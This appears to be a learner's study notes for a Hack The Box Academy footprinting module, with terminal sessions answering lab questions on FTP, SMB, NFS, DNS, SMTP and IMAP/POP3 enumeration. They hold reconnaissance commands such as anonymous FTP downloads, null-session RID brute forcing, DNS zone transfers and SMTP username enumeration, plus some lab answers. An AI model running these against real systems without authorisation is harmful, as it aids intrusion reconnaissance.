...
We can also output the results in JSON format.
    ...
    NemBanTom@htb[/htb]$ curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .
...
If needed, we can also have them filtered by the unique subdomains.
    ...
    NemBanTom@htb[/htb]$ curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
...
**Company Hosted Servers:**
    ...
    NemBanTom@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
...
[Shodan](https://www.shodan.io/) can be used to find devices and systems permanently connected to the Internet like `Internet of Things` (`IoT`). It searches the Internet for open TCP/IP ports and filters the systems according to specific terms and criteria. For example, open HTTP or HTTPS ports and other server ports for `FTP`, `SSH`, `SNMP`, `Telnet`, `RTSP`, or `SIP` are searched. As a result, we can find devices and systems, such as `surveillance cameras`, `servers`, `smart home systems`, `industrial controllers`, `traffic lights` and `traffic controllers`, and various network components.
    ...
    NemBanTom@htb[/htb]$ for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
    NemBanTom@htb[/htb]$ for i in $(cat ip-addresses.txt);do shodan host $i;done
...
**DNS Records:**
    ...
    NemBanTom@htb[/htb]$ dig any inlanefreight.com
...
intext:text inurl:blob.cire.windows.net
...
**Anonymous Login:**
    ...
    NemBanTom@htb[/htb]$ ftp 10.129.14.136
...
In our pc:
    ...
    NemBanTom@htb[/htb]$ ls | grep Notes.txt
...
We can update this database of NSE scripts with the command shown.
...
As we already know, the FTP server usually runs on the standard TCP port 21, which we can scan using Nmap. We also use the version scan (`-sV`), aggressive scan (`-A`), and the default script scan (`-sC`) against our target `10.129.14.136`.
    ...
    NemBanTom@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136
...
The `ftp-syst`, for example, executes the `STAT` command, which displays information about the FTP server status. This includes configurations as well as the version of the FTP server. Nmap also provides the ability to trace the progress of NSE scripts at the network level if we use the `--script-trace` option in our scans. This lets us see what commands Nmap sends, what ports are used, and what responses we receive from the scanned server.
    ...
    NemBanTom@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
...
It looks slightly different if the FTP server runs with TLS/SSL encryption. Because then we need a client that can handle TLS/SSL. For this, we can use the client `openssl` and communicate with the FTP server. The good thing about using `openssl` is that we can see the SSL certificate, which can also be helpful.
    ...
    NemBanTom@htb[/htb]$ openssl s_client -connect 10.129.14.136:21 -starttls ftp
...
2)Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer.
    ...
    ┌─[eu-academy-4]─[10.10.14.97]─[htb-ac-2122384@htb-t3qc4mgzyn]─[~]
    └──╼ [★]$ nmap -A -sC -sV -p20,21 10.129.195.110
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-25 16:06 CST
    Nmap scan report for 10.129.195.110
    ...
    SF-Port21-TCP:V=7.94SVN%I=7%D=12/25%Time=694DB578%P=x86_64-pc-linux-gnu%r(
    ...
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=12/25%OT=21%CT=20%CU=34690%PV=Y%DS=2%DC=T%G=Y%TM=69
    OS:4DB5BA%P=x86_64-pc-linux-gnu)SEQ(SP=10A%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=
...
Download with wget:
    ...
    ┌─[eu-academy-4]─[10.10.14.97]─[htb-ac-2122384@htb-t3qc4mgzyn]─[~]
    └──╼ [★]$ wget -m --no-passive ftp://anonymous@10.129.195.110
    --2025-12-25 16:14:34--  ftp://anonymous@10.129.195.110/
               => ‘10.129.195.110/.listing’
    Connecting to 10.129.195.110:21... connected.
    Logging in as anonymous ... Logged in!
    ==> SYST ... done.    ==> PWD ... done.
    ==> TYPE I ... done.  ==> CWD not needed.
    ==> PORT ... done.    ==> LIST ... done.
    
    10.129.195.110/.lis     [ <=>             ]     380  --.-KB/s    in 0s      
    
    2025-12-25 16:14:44 (1.90 MB/s) - ‘10.129.195.110/.listing’ saved [380]
    
    --2025-12-25 16:14:44--  ftp://anonymous@10.129.195.110/.bash_logout
               => ‘10.129.195.110/.bash_logout’
    ==> CWD not required.
    ==> PORT ... done.    ==> RETR .bash_logout ... done.
    Length: 220
    
    10.129.195.110/.bas 100%[================>]     220  --.-KB/s    in 0s      
    
    2025-12-25 16:14:45 (1.36 MB/s) - ‘10.129.195.110/.bash_logout’ saved [220]
    
    --2025-12-25 16:14:45--  ftp://anonymous@10.129.195.110/.bashrc
               => ‘10.129.195.110/.bashrc’
    ==> CWD not required.
    ==> PORT ... done.    ==> RETR .bashrc ... done.
    Length: 3771 (3.7K)
    
    10.129.195.110/.bas 100%[================>]   3.68K  --.-KB/s    in 0.001s  
    
    2025-12-25 16:14:45 (4.59 MB/s) - ‘10.129.195.110/.bashrc’ saved [3771]
    
    --2025-12-25 16:14:45--  ftp://anonymous@10.129.195.110/flag.txt
               => ‘10.129.195.110/flag.txt’
    ==> CWD not required.
    ==> PORT ... done.    ==> RETR flag.txt ... done.
    Length: 39
    
    10.129.195.110/flag 100%[================>]      39  --.-KB/s    in 0s      
    
    2025-12-25 16:14:45 (200 KB/s) - ‘10.129.195.110/flag.txt’ saved [39]
    
    --2025-12-25 16:14:45--  ftp://anonymous@10.129.195.110/.profile
               => ‘10.129.195.110/.profile’
    ==> CWD not required.
    ==> PORT ... done.    ==> RETR .profile ... done.
    Length: 807
    
    10.129.195.110/.pro 100%[================>]     807  --.-KB/s    in 0s      
    
    2025-12-25 16:14:45 (2.79 MB/s) - ‘10.129.195.110/.profile’ saved [807]
    
    FINISHED --2025-12-25 16:14:45--
    Total wall clock time: 11s
    Downloaded: 5 files, 5.1K in 0.002s (3.12 MB/s)
    
    
    
    ┌─[eu-academy-4]─[10.10.14.97]─[htb-ac-2122384@htb-t3qc4mgzyn]─[~]
    └──╼ [★]$ ls
    10.129.195.110  Desktop    Downloads  Pictures  Templates
    cacert.der      Documents  Music      Public    Videos
    ┌─[eu-academy-4]─[10.10.14.97]─[htb-ac-2122384@htb-t3qc4mgzyn]─[~]
    └──╼ [★]$ cd 10.129.195.110/
    ┌─[eu-academy-4]─[10.10.14.97]─[htb-ac-2122384@htb-t3qc4mgzyn]─[~/10.129.195.110]
    └──╼ [★]$ ls
    flag.txt
    ┌─[eu-academy-4]─[10.10.14.97]─[htb-ac-2122384@htb-t3qc4mgzyn]─[~/10.129.195.110]
    └──╼ [★]$ cat flag.txt 
...
As we can imagine, Samba offers a wide range of [settings](https://www.samba.org/samba/docs/current/man-html/smb.conf.5.html) that we can configure. Again, we define the settings via a text file where we can get an overview of some of the settings. These settings look like the following when filtered out:
    ...
    NemBanTom@htb[/htb]$ cat /etc/samba/smb.conf | grep -v "#\|\;" 
...
Now we can display a list (`-L`) of the server's shares with the `smbclient` command from our host. We use the so-called `null session` (`-N`), which is `anonymous` access without the input of existing users or valid passwords.
    ...
    NemBanTom@htb[/htb]$ smbclient -N -L //10.129.14.128
...
We can see that we now have five different shares on the Samba server from the result. Thereby `print$` and an `IPC$` are already included by default in the basic setting, as we have already seen. Since we deal with the `[notes]` share, let us log in and inspect it using the same client program. If we are not familiar with the client program, we can use the `help` command on successful login, listing all the possible commands we can execute.
    ...
    NemBanTom@htb[/htb]$ smbclient //10.129.14.128/notes
...
Nmap:
    ...
    NemBanTom@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
...
The [Remote Procedure Call](https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/) (`RPC`) is a concept and, therefore, also a central tool to realize operational and work-sharing structures in networks and client-server architectures. The communication process via RPC includes passing parameters and the return of a function value.
    ...
    NemBanTom@htb[/htb]$ rpcclient -U "" 10.129.14.128
...
Brute forcing users RID:
    ...
    NemBanTom@htb[/htb]$ for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
...
**Impacket - Samrdump.py:**
    ...
    NemBanTom@htb[/htb]$ samrdump.py 10.129.14.128
...
**SMBmap:**
    ...
    NemBanTom@htb[/htb]$ smbmap -H 10.129.14.128
...
**CrackMapExec:**
    ...
    NemBanTom@htb[/htb]$ crackmapexec smb 10.129.14.128 --shares -u '' -p ''
...
Installation:
    ...
    NemBanTom@htb[/htb]$ git clone https://github.com/cddmp/enum4linux-ng.git
    NemBanTom@htb[/htb]$ cd enum4linux-ng
    NemBanTom@htb[/htb]$ pip3 install -r requirements.txt

Enum:

    NemBanTom@htb[/htb]$ ./enum4linux-ng.py 10.129.14.128 -A
...
Q1: What version of the SMB server is running on the target system? Submit the entire banner as the answer. - Samba smbd 4.6.2

    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~]
    └──╼ [★]$ nmap -sC -sV -p1-500 10.129.134.215
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-27 04:34 CST
    Stats: 0:00:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 90.91% done; ETC: 04:35 (0:00:00 remaining)
    Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 95.45% done; ETC: 04:35 (0:00:01 remaining)
    Nmap scan report for 10.129.134.215
    ...
    |   100005  1,2,3      34663/tcp6  mountd
    |   100005  1,2,3      35518/udp6  mountd
    |   100005  1,2,3      56787/tcp   mountd
    |   100005  1,2,3      58862/udp   mountd
    |   100021  1,3,4      35949/tcp6  nlockmgr
    |   100021  1,3,4      41757/tcp   nlockmgr
    |   100021  1,3,4      47298/udp6  nlockmgr
    |   100021  1,3,4      48113/udp   nlockmgr
    ...
    445/tcp open  netbios-ssn Samba smbd 4.6.2
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port21-TCP:V=7.94SVN%I=7%D=12/27%Time=694FB64E%P=x86_64-pc-linux-gnu%r(
    SF:GenericLines,74,"220\x20InFreight\x20FTP\x20v1\.1\r\n500\x20Invalid\x20
    SF:command:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20comma
    SF:nd:\x20try\x20being\x20more\x20creative\r\n");
...
Q2: What is the name of the accessible share on the target? - sambashare

    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~]
    └──╼ [★]$ smbclient -L //10.129.134.215
    Password for [WORKGROUP\htb-ac-2122384]:
...
Q3: Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.
    ...
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~]
    └──╼ [★]$ smbclient //10.129.134.215/sambashare
    Password for [WORKGROUP\htb-ac-2122384]:
    Try "help" to get a list of possible commands.
    smb: \> ls
      ...
      .bashrc                             H     3771  Tue Feb 25 06:03:22 2020
            ...
            4062912 blocks of size 1024. 414264 blocks available
    smb: \> cd contents\
    smb: \contents\> ls
    ...
    getting file \contents\flag.txt of size 38 as flag.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
    smb: \contents\> exit
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~]
    └──╼ [★]$ ls
...
Q4: Find out which domain the server belongs to. - Devops

    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~]
    └──╼ [★]$ rpcclient -U "" 10.129.134.215
...
Q5: Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer. - InFreight SMB v3.1
...
Q6: What is the full system path of that specific share? (format: "/directory/names") - A fentioutputban látható: /home/sambauser
...
NFS is not difficult to configure because there are not as many options as FTP or SMB have. The `/etc/exports` file contains a table of physical filesystems on an NFS server accessible by the clients. The [NFS Exports Table](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html) shows which options it accepts and thus indicates which options are available to us.
    ...
    NemBanTom@htb[/htb]$ cat /etc/exports 
...
Nmap:
    ...
    NemBanTom@htb[/htb]$ sudo nmap 10.129.14.128 -p111,2049 -sV -sC
...
The `rpcinfo` NSE script retrieves a list of all currently running RPC services, their names and descriptions, and the ports they use. This lets us check whether the target share is connected to the network on all required ports. Also, for NFS, Nmap has some NSE scripts that can be used for the scans. These can then show us, for example, the `contents` of the share and its `stats`.
    ...
    NemBanTom@htb[/htb]$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
...
**Show Available NFS Shares:**
    ...
    NemBanTom@htb[/htb]$ showmount -e 10.129.14.128
...
**Mounting NFS Shares:**
    ...
    NemBanTom@htb[/htb]$ mkdir target-NFS
    NemBanTom@htb[/htb]$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
    NemBanTom@htb[/htb]$ cd target-NFS
    NemBanTom@htb[/htb]$ tree .
...
**List Contents with Usernames & Group Names:**
    ...
    NemBanTom@htb[/htb]$ ls -l mnt/nfs/
...
**List Contents with UIDs & GUIDs:**
    ...
    NemBanTom@htb[/htb]$ ls -n mnt/nfs/
...
**Unmounting:**
    ...
    NemBanTom@htb[/htb]$ cd ..
    NemBanTom@htb[/htb]$ sudo umount ./target-NFS
...
V:
    ...
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~]
    └──╼ [★]$ sudo nmap -sV --script=nfs* -p111,2049 10.129.202.5
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-27 05:13 CST
    ...
    |   100003  3,4         2049/tcp   nfs
    |   100003  3,4         2049/tcp6  nfs
    |   100005  1,2,3      42409/udp   mountd
    |   100005  1,2,3      45638/udp6  mountd
    |   100005  1,2,3      58041/tcp   mountd
    |   100005  1,2,3      59931/tcp6  mountd
    |   100021  1,3,4      34561/tcp   nlockmgr
    |   100021  1,3,4      38235/tcp6  nlockmgr
    |   100021  1,3,4      39111/udp6  nlockmgr
    |   100021  1,3,4      56976/udp   nlockmgr
    |   100227  3           2049/tcp   nfs_acl
    |   100227  3           2049/tcp6  nfs_acl
    |   100227  3           2049/udp   nfs_acl
    |_  100227  3           2049/udp6  nfs_acl
...
mount it:
    ...
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~]
    └──╼ [★]$ sudo mount -t nfs 10.129.202.5:/ ./nfs1/ -o nolock
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~]
    └──╼ [★]$ cd nfs1

Get the flags:

    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1]
    └──╼ [★]$ ls
    mnt  var
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1]
    └──╼ [★]$ ls -l /mnt/nfs
    ...
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1]
    └──╼ [★]$ cd mnt
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1/mnt]
    └──╼ [★]$ ls
    nfsshare
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1/mnt]
    └──╼ [★]$ cd nfsshare/
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1/mnt/nfsshare]
    └──╼ [★]$ ls
    flag.txt
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1/mnt/nfsshare]
    └──╼ [★]$ cat flag.txt
    ...
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1]
    └──╼ [★]$ cd var
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1/var]
    └──╼ [★]$ ls
    nfs
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1/var]
    └──╼ [★]$ cd nfs
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1/var/nfs]
    └──╼ [★]$ ls
    flag.txt
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-moa2kg8ust]─[~/nfs1/var/nfs]
    └──╼ [★]$ cat flag.txt
...
The `SOA` record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.
    ...
    NemBanTom@htb[/htb]$ dig soa www.inlanefreight.com
...
DIG - NS Query:
    ...
    NemBanTom@htb[/htb]$ dig ns inlanefreight.htb @10.129.14.128
...
DIG - Version Query:
    ...
    NemBanTom@htb[/htb]$ dig CH TXT version.bind 10.129.120.85
...
DIG - ANY Query:
    ...
    NemBanTom@htb[/htb]$ dig any inlanefreight.htb @10.129.14.128
...
**DIG - AXFR Zone Transfer:**
    ...
    NemBanTom@htb[/htb]$ dig axfr inlanefreight.htb @10.129.14.128
...
**DIG - AXFR Zone Transfer - Internal:**
    ...
    NemBanTom@htb[/htb]$ dig axfr internal.inlanefreight.htb @10.129.14.128
...
**Subdomain Brute Forcing:**
    ...
    NemBanTom@htb[/htb]$ for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
...
Many different tools can be used for this, and most of them work in the same way. One of these tools is, for example [DNSenum](https://github.com/fwaeytens/dnsenum).
    ...
    NemBanTom@htb[/htb]$ dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
...
Q1: Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain.
    ...
    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-tfcjqedr7o]─[~]
    └──╼ [★]$ dig ns inlanefreight.htb @10.129.42.195
    
    ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> ns inlanefreight.htb @10.129.42.195
    ;; global options: +cmd
    ;; Got answer:
    ...
    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 4096
    ; COOKIE: 3b903f752130677f01000000694ffc4cf211ed8def97cf8c (good)
    ;; QUESTION SECTION:
    ;inlanefreight.htb.        IN    NS
    ...
    ;; WHEN: Sat Dec 27 09:33:33 CST 2025
    ;; MSG SIZE  rcvd: 107
...
Q2: Identify if its possible to perform a zone transfer and submit the TXT record as the answer. (Format: HTB{...})
    ...
    ;; WHEN: Sat Dec 27 09:38:42 CST 2025
    ...
    ;; Query time: 53 msec
    ;; SERVER: 10.129.42.195#53(10.129.42.195) (TCP)
    ;; WHEN: Sat Dec 27 09:39:38 CST 2025
    ;; XFR size: 15 records (messages 1, bytes 677)

Q3: What is the IPv4 address of the hostname DC1? - A feni outputban ott van ad1.internal.inlanefreight.htb IP-je(A rekordja).
...
If you look at the data from the zone transfer, you'll see a few subdomains like app, dev, internal, and mail1. One of the questions asks if it's possible to make a zone transfer, and indeed we can with one of the subdomains. If you try with the others, you'll get no response.

This is kind of tricky because the last question asks us about the FQDN of the host that ends in x.x.x.203. A normal zone transfer is sometimes not enough, which is why the lesson told us about other tools such as bash scripting and dnsenum. These tools allow us to perform a deeper enumeration of a domain.

So, by trying with the other subdomains and different wordlists, you'll eventually find the correct answer. The exercise is mostly designed to make us dig further into DNS enumeration.

    ┌─[eu-academy-4]─[10.10.14.114]─[htb-ac-2122384@htb-tfcjqedr7o]─[~]
    └──╼ [★]$ dnsenum -dnsserver 10.129.42.195 -enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb
    dnsenum VERSION:1.2.6
...
Each SMTP server can be configured in many ways, as can all other services. However, there are differences because the SMTP server is only responsible for sending and forwarding emails.
    ...
    NemBanTom@htb[/htb]$ cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
...
**Telnet - HELO/EHLO:**
    ...
    NemBanTom@htb[/htb]$ telnet 10.129.14.128 25
...
Q1: Enumerate the SMTP service and submit the banner, including its version as the answer.
    ...
    ┌─[eu-academy-4]─[10.10.14.167]─[htb-ac-2122384@htb-yptux0dmze]─[~]
    └──╼ [★]$ sudo nmap -sV -sC -p25,587 10.129.151.85
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-28 05:13 CST
    Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
    NSE Timing: About 97.96% done; ETC: 05:14 (0:00:00 remaining)
    Nmap scan report for 10.129.151.85
    ...
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port25-TCP:V=7.94SVN%I=7%D=12/28%Time=69511102%P=x86_64-pc-linux-gnu%r(
...
Q2: Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer. - robin

    ┌─[eu-academy-4]─[10.10.14.167]─[htb-ac-2122384@htb-yptux0dmze]─[~/smtp-user-recon]
    └──╼ [★]$ python smtp-user-recon.py 10.129.151.85 users.txt 
    [*] Starting SMTP VRFY scan on 10.129.151.85
    [*] Using wordlist: users.txt
    [+] Opening connection to 10.129.151.85 on port 25: Done
    [*] Server banner: 220 InFreight ESMTP v2.11
    [*] Sending HELO command...
    [*] HELO response: 250 mail1
    [*] Testing 101 usernames...
    [-] Invalid User: michael
    [-] Invalid User: linda
    [-] Invalid User: mark
    [-] Invalid User: elizabeth
    [!] Server limiting connections: 421 4.7.0 mail1 Error: too many errors
    [*] Reconnecting and continuing with username: joshua
    [*] Closed connection to 10.129.151.85 port 25
    [+] Opening connection to 10.129.151.85 on port 25: Done
    [*] Server banner: 220 InFreight ESMTP v2.11
    [*] Sending HELO command...
    [*] HELO response: 250 mail1
    ...
    [-] Invalid User: eric
    [!] Server limiting connections: 421 4.7.0 mail1 Error: too many errors
    [*] Reconnecting and continuing with username: jacob
    [*] Closed connection to 10.129.151.85 port 25
    [+] Opening connection to 10.129.151.85 on port 25: Done
    [*] Server banner: 220 InFreight ESMTP v2.11
    [*] Sending HELO command...
    [*] HELO response: 250 mail1
    [-] Invalid User: jacob
    [-] Invalid User: nicholas
    [-] Invalid User: donna
    [!] Server limiting connections: 421 4.7.0 mail1 Error: too many errors
    [*] Reconnecting and continuing with username: jose
    [*] Closed connection to 10.129.151.85 port 25
    [+] Opening connection to 10.129.151.85 on port 25: Done
    [*] Server banner: 220 InFreight ESMTP v2.11
    [*] Sending HELO command...
    [*] HELO response: 250 mail1
    [-] Invalid User: jose
    [-] Invalid User: rebecca
    [-] Invalid User: tyler
    [!] Server limiting connections: 421 4.7.0 mail1 Error: too many errors
    [*] Reconnecting and continuing with username: samuel
    [*] Closed connection to 10.129.151.85 port 25
    [+] Opening connection to 10.129.151.85 on port 25: Done
    [*] Server banner: 220 InFreight ESMTP v2.11
    [*] Sending HELO command...
...
If we successfully figure out the access credentials for one of the employees, an attacker could log in to the mail server and read or even send the individual messages.
    ...
    NemBanTom@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
...
If we also use the `verbose` (`-v`) option, we will see how the connection is made. From this, we can see the version of TLS used for encryption, further details of the SSL certificate, and even the banner, which will often contain the version of the mail server.
    ...
    NemBanTom@htb[/htb]$ curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
...
**OpenSSL - TLS Encrypted Interaction POP3:**
    ...
    NemBanTom@htb[/htb]$ openssl s_client -connect 10.129.14.128:pop3s
...
**OpenSSL - TLS Encrypted Interaction IMAP:**
    ...
    NemBanTom@htb[/htb]$ openssl s_client -connect 10.129.14.128:imaps
...
Q1: Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer. - InlaneFreight ltf

    ┌─[eu-academy-4]─[10.10.14.188]─[htb-ac-2122384@htb-ud6poinxlt]─[~]
    └──╼ [★]$ nmap -sVC -p110,143,993,995 10.129.148.89
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-29 04:09 CST
    Nmap scan report for 10.129.148.89
    ...
    |_imap-capabilities: Pre-login OK have IMAP4rev1 post-login listed IDLE LOGINDISABLEDA0001 more LITERAL+ capabilities LOGIN-REFERRALS ENABLE STARTTLS ID SASL-IR
    | ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
    | Not valid before: 2021-11-08T23:10:05
    |_Not valid after:  2295-08-23T23:10:05
    |_ssl-date: TLS randomness does not represent time
    ...
    | Not valid before: 2021-11-08T23:10:05
    |_Not valid after:  2295-08-23T23:10:05
    |_imap-capabilities: Pre-login capabilities IMAP4rev1 have post-login IDLE listed more LITERAL+ AUTH=PLAINA0001 LOGIN-REFERRALS OK ENABLE ID SASL-IR
    995/tcp open  ssl/pop3 Dovecot pop3d
    |_pop3-capabilities: TOP RESP-CODES USER CAPA AUTH-RESP-CODE SASL(PLAIN) PIPELINING UIDL
    | ssl-cert: Subject: commonName=dev.inlanefreight.htb/organizationName=InlaneFreight Ltd/stateOrProvinceName=London/countryName=UK
    | Not valid before: 2021-11-08T23:10:05
    |_Not valid after:  2295-08-23T23:10:05
    |_ssl-date: TLS randomness does not represent time
...
Q2: What is the FQDN that the IMAP and POP3 servers are assigned to? - dev.inlanefreight.htb - fenti nmap reportból látszik.

Q3:Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})

    ┌─[eu-academy-4]─[10.10.14.188]─[htb-ac-2122384@htb-ud6poinxlt]─[~]
    └──╼ [★]$ telnet 10.129.148.89 143
    Trying 10.129.148.89...
    Connected to 10.129.148.89.
    Escape character is '^]'.
...
Q4: What is the customized version of the POP3 server?
    ...
    ┌─[eu-academy-4]─[10.10.14.188]─[htb-ac-2122384@htb-ud6poinxlt]─[~]
    └──╼ [★]$ telnet 10.129.148.89 110
    Trying 10.129.148.89...
    Connected to 10.129.148.89.
    Escape character is '^]'.
    +OK InFreight POP3 v9.188

Q5: What is the admin email address? - devadmin@inlanefreight.htb

    ┌─[eu-academy-4]─[10.10.14.188]─[htb-ac-2122384@htb-ud6poinxlt]─[~]
    └──╼ [★]$ openssl s_client -connect 10.129.148.89:imaps
    CONNECTED(00000003)
    Can't use SSL_get_servername
    ...
    SSL-Session:
        Protocol  : TLSv1.3
        Cipher    : TLS_AES_256_GCM_SHA384
        Session-ID: 5950C105FB10E7F040ED3BAC3F857C42525C0AB7FC59235A469E601926033492
        Session-ID-ctx: 
        Resumption PSK: B195305CEF930BFE8FE7BA378676F64D0DDA79AEFA2A53997857508C406EAF8853F0EFDEF3B8BFA6299A8C80FF8F9AE1
        PSK identity: None
        PSK identity hint: None
        SRP username: None
        TLS session ticket lifetime hint: 7200 (seconds)
        TLS session ticket:
        0000 - e1 48 61 7d 2a 07 91 0d-d6 8d 02 61 02 55 dc 3a   .Ha}*......a.U.:
        0010 - be 5d 53 89 27 ef 1f 6d-19 79 97 ba 97 c6 0f 73   .]S.'..m.y.....s
        0020 - 65 ff 64 c1 a3 4a dc 5c-b9 33 7c 08 e5 5c 83 4a   e.d..J.\.3|..\.J
        0030 - 2a 01 35 84 7a ad 64 7d-e0 c0 b6 fb e1 50 99 98   *.5.z.d}.....P..
        0040 - 34 ee 5e 9f 21 ee fe 8a-7a 24 64 07 23 99 3e ce   4.^.!...z$d.#.>.
        0050 - 44 3a b3 87 14 a8 51 ee-23 12 ee 18 31 31 8f 47   D:....Q.#...11.G
        0060 - a6 ec 3b 06 2f 67 7c 4f-bb 84 9d 48 2d 79 73 0d   ..;./g|O...H-ys.
        0070 - 3f 21 58 34 91 8a e6 32-95 3d ce 7e 0e 6d 34 e1   ?!X4...2.=.~.m4.
        0080 - 79 4b a8 c4 75 26 ff 7d-c9 4b f8 fe ce 4f 2c df   yK..u&.}.K...O,.
        0090 - e3 6c d8 1e e9 9e e2 14-08 0b 27 bb 7a f8 17 0b   .l........'.z...
        00a0 - f8 d6 33 91 f6 9c a7 3d-7d 63 68 04 7f 9d 3b 6c   ..3....=}ch...;l
        00b0 - d9 44 83 aa 1b d6 18 31-fa 26 c9 73 2a 80 34 57   .D.....1.&.s*.4W
    
        Start Time: 1767004123
        Timeout   : 7200 (sec)
        Verify return code: 18 (self-signed certificate)
        Extended master secret: no
        Max Early Data: 0
    ...
    SSL-Session:
        Protocol  : TLSv1.3
        Cipher    : TLS_AES_256_GCM_SHA384
        Session-ID: 73058EE8BCAA2136B9D21A7064024AC9C19D4FDDC2ED85513BAEF3B2E8BE067E
        Session-ID-ctx: 
        Resumption PSK: 3405B97365F956DACF2DF4187F2279C3AD0A4B1F8DEEC7607D326C5F25A635E3A62249297FBE275EEB51E60E66248DDE
        PSK identity: None
        PSK identity hint: None
        SRP username: None
        TLS session ticket lifetime hint: 7200 (seconds)
        TLS session ticket:
        0000 - e1 48 61 7d 2a 07 91 0d-d6 8d 02 61 02 55 dc 3a   .Ha}*......a.U.:
        0010 - c1 b7 31 2a 5c 9a 67 b0-9e 09 0c 17 49 e1 05 bb   ..1*\.g.....I...
        0020 - ca 23 16 29 84 9b 00 b2-b6 6a 1c 53 a1 e2 78 84   .#.).....j.S..x.
        0030 - 5e c0 c2 75 30 a1 78 97-5c 8d 01 c0 f3 3a a8 33   ^..u0.x.\....:.3
